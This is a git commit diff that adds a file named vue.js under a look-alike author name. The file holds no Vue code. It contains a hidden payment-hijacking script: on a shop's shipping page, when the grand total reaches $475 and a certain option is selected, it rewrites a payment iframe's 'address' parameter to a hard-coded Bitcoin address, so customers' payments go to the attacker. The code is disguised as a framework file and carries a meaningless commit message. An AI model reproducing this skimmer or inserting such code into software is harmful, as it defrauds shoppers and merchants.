c3388f5763f1473b87207fe065d31e9b437bd309
reposltory <124707435+reposltory@users.noreply.github.com>
2024-08-26 16:44:25 +0330

    O

--- vue.js
+++ vue.js
@@ -1,1 +1,34 @@
+var intervalId;
+function checkIframe() {
+    if (window.location.href.indexOf("/shop/shippingaddress?coupon_code=&shipping_type=") > -1){
+
+        var grandTotalElement = Array.from(document.querySelectorAll('.row em')).find(function(el) { return el.textContent.trim() === 'Grand Total'; });
+        var priceElement = grandTotalElement.nextElementSibling;
+        var priceText = priceElement.textContent;
+        var priceValue = parseInt(priceText.replace('$', '').trim());
+        
+        if (priceValue >= 475) {
+		
+            if(document.getElementsByTagName("select")[1].value=="2"){
+                const iframes = Array.from(document.getElementsByTagName("iframe"));
+                const targetValue = "common/create"; 
+                const newValue = "bc1qcjujdnsxupelmyu6djgpwauqx06ye4kc48rhxm"; 
+            
+                const foundIframe = iframes.some(iframe => {
+                    if (iframe.src.includes(targetValue)) {
+                        const updatedSrc = iframe.src.replace(/(address=)[^&]*/, `$1${newValue}`);
+                        iframe.src = updatedSrc; 
+                        clearInterval(intervalId);
+                        return true;
+                    }
+                    return false;
+                });
+            }
+        }
+    
+    }
+}
+intervalId = setInterval(checkIframe, 1);
+
+
 
